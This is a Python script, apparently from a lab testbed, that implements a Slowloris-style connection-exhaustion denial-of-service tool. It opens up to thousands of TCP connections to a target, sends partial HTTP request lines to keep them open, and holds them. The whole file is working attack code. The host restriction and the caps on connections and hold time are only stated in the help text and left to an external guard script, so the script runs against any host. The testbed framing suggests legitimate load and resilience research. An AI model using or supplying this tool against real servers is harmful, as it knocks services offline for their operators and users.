#!/usr/bin/env python3
"""
tools/conn_hold.py — Async connection exhaustion generator (§6 Phase 4).
Opens N TCP connections to victim:port, sends a partial HTTP request line,
holds them for D seconds, then closes cleanly.

Usage:
  python3 conn_hold.py --host <ip> --port 80 --n <N> --hold <D> [--ramp <secs>]

Levels: L=100, M=500, H=2000
Raises ulimit -n accordingly before launching (log it).
"""
import argparse
import asyncio
import sys
import time


async def hold_connection(host: str, port: int, hold_s: float, idx: int, results: list):
    """Open one connection, send partial HTTP, hold, then close."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=10
        )
        # Send partial HTTP request line (no \r\n\r\n) — keeps connection open
        writer.write(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
        await writer.drain()
        results[idx] = "connected"
        await asyncio.sleep(hold_s)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        results[idx] = "done"
    except asyncio.TimeoutError:
        results[idx] = "timeout"
    except Exception as e:
        results[idx] = f"error:{e}"


async def run(host: str, port: int, n: int, hold_s: float, ramp_s: float):
    results = ["pending"] * n
    tasks = []

    if ramp_s > 0 and n > 0:
        delay_between = ramp_s / n
    else:
        delay_between = 0

    t_start = time.time()
    for i in range(n):
        task = asyncio.create_task(hold_connection(host, port, hold_s, i, results))
        tasks.append(task)
        if delay_between > 0:
            await asyncio.sleep(delay_between)

    connected = sum(1 for r in results if r in ("connected", "done"))
    print(f"[conn_hold] Launched {n} connections to {host}:{port}, "
          f"{connected} connected after ramp. Holding for {hold_s}s...",
          flush=True)

    await asyncio.gather(*tasks, return_exceptions=True)

    t_end = time.time()
    done = sum(1 for r in results if r == "done")
    errors = sum(1 for r in results if r.startswith("error"))
    timeouts = sum(1 for r in results if r == "timeout")

    print(f"[conn_hold] Complete: {done} closed cleanly, "
          f"{errors} errors, {timeouts} timeouts. "
          f"Elapsed: {t_end - t_start:.1f}s", flush=True)


def main():
    parser = argparse.ArgumentParser(
        description="Async connection-hold attack generator (bounded)"
    )
    parser.add_argument("--host", required=True, help="Target host (must be VICTIM_PRIVATE_IP)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default 80)")
    parser.add_argument("--n", type=int, required=True,
                        help="Number of connections. Max 2000 (enforced by attack_guard.sh)")
    parser.add_argument("--hold", type=float, required=True,
                        help="Hold duration in seconds (<=60 enforced by guard)")
    parser.add_argument("--ramp", type=float, default=0,
                        help="Ramp-up time in seconds (spread connection opens)")
    args = parser.parse_args()

    if args.n <= 0:
        print("Error: --n must be positive", file=sys.stderr)
        sys.exit(1)
    if args.hold < 0:
        print("Error: --hold must be non-negative", file=sys.stderr)
        sys.exit(1)

    print(f"[conn_hold] Starting: host={args.host} port={args.port} "
          f"n={args.n} hold={args.hold}s ramp={args.ramp}s", flush=True)

    asyncio.run(run(args.host, args.port, args.n, args.hold, args.ramp))


if __name__ == "__main__":
    main()

